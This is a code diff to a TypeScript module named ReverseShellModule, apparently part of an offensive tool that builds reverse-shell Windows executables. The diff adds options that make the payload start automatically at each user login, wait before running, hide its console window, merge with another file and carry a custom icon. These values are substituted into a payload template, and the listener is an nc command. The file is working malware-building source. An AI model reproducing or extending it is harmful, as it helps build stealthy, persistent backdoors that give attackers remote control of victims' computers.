@@ -10,9 +10,6 @@ import path from 'path';
 import { Module } from '../../classes/Module';
 import { cmdWarn } from '../../utils/cmd';
 
-// set the path to rh.zip
-process.env["SOURCE_RESOURCE_HACKER"] = __dirname + '/rh.zip';
-
 // save the path to pkg cache folder
 const cachePath = path.join(__dirname, '../../pkg-cache');
 const PKG_CACHE_VERSION = 'v2.6';
@@ -25,14 +22,17 @@ export default class ReverseShellModule extends Module {
     finalExeName = 'payload.exe';
     finalExeDescription = 'sussy backa';
     runSilent: 'true'|'false' = 'true';
+    isPersistent: 'true'|'false' = 'true';
+    isFilesDependant: 'true'|'false' = 'false';
     mergeFilePath = '';
     hostCmd = `nc -n 127.0.0.1 -l ${this.listenPort}`;
+    waitRun = 0;
     
     public args = [
         {
             arg: 'l_port=',
             desc: "Set listening port. Default is 4242",
-            handler: port => this.listenPort = port 
+            handler: this.handleSetPort
         },
         {
             arg: 'l_host=',
@@ -55,9 +55,24 @@ export default class ReverseShellModule extends Module {
             handler: this.handleSetMergePath
         },
         {
+            arg: 'wait_sec=',
+            desc: "Set number of seconds to wait before executing the payload.",
+            handler: this.handleSetWaitSec 
+        },
+        {
             arg: 'run_silent=',
             desc: "Should the exe hide the console window. Default is true.",
-            handler: silent => ['true', 'false'].includes(silent.toLowerCase()) && (this.runSilent = silent) 
+            handler: this.handleSetSilent
+        },
+        {
+            arg: 'persist=',
+            desc: "Should the exe auto start on each user login. Default is true.",
+            handler: this.handleSetAutoStart
+        },
+        {
+            arg: 'link_files=',
+            desc: "Set this to true if the exe is supposed to use the files in the folder it is ran from. Default is false.",
+            handler: this.handleSetLinkFiles 
         },
         {
             arg: 'ico_path=',
@@ -75,6 +90,41 @@ export default class ReverseShellModule extends Module {
             handler: this.handleListen
         }
     ]
+    
+    handleSetPort(port){
+        if(isNaN(Number(port))){
+            cmdWarn(`Error, l_port= expects a number, got ${port}`);
+            return;
+        }
+        this.listenPort = Number(port)
+    }
+
+    handleSetWaitSec(sec) {
+        if(isNaN(Number(sec))){
+            cmdWarn(`Error, wait_run= expects a number, got ${sec}`);
+            return;
+        }
+        this.waitRun = Number(sec)
+    }
+
+
+    handleSetSilent(value) {
+        if(['true', 'false'].includes(value.toLowerCase()))
+        this.runSilent = value.toLowerCase()
+        else cmdWarn(`Error, run_silent= expects a true or false. Got: ${value}`);
+    }
+
+    handleSetAutoStart(value){
+        if(['true', 'false'].includes(value.toLowerCase()))
+        this.isPersistent = value.toLowerCase()
+        else cmdWarn(`Error, persist= expects a true or false. Got: ${value}`);
+    }
+
+    handleSetLinkFiles(value) {
+        if(['true', 'false'].includes(value.toLowerCase()))
+        this.isFilesDependant = value.toLowerCase()
+        else cmdWarn(`Error, link_files= expects a true or false. Got: ${value}`);
+    }
 
     handleSetMergePath(path: string) {
         if(!fs.existsSync(path)){
@@ -178,6 +228,11 @@ export default class ReverseShellModule extends Module {
         let str:string = fs.readFileSync(__dirname + '/template.js').toString();
         str = str.replace('{{HOST}}', this.hostIp);
         str = str.replace('{{HAS_MERGE}}', this.mergeFilePath.length > 0 ? "true" : "false");
+        str = str.replace('{{FILES_DEPENDANT}}', this.isFilesDependant);
+        str = str.replace('{{PERSISTENT}}', this.isPersistent);
+        str = str.replace('{{MERGE_NAME}}', this.finalExeName);
+        str = str.replace('{{LISTEN_PORT}}', this.listenPort.toString());
+        str = str.replace('{{WAIT_TIME}}', this.waitRun.toString());
         return str;
     }
 
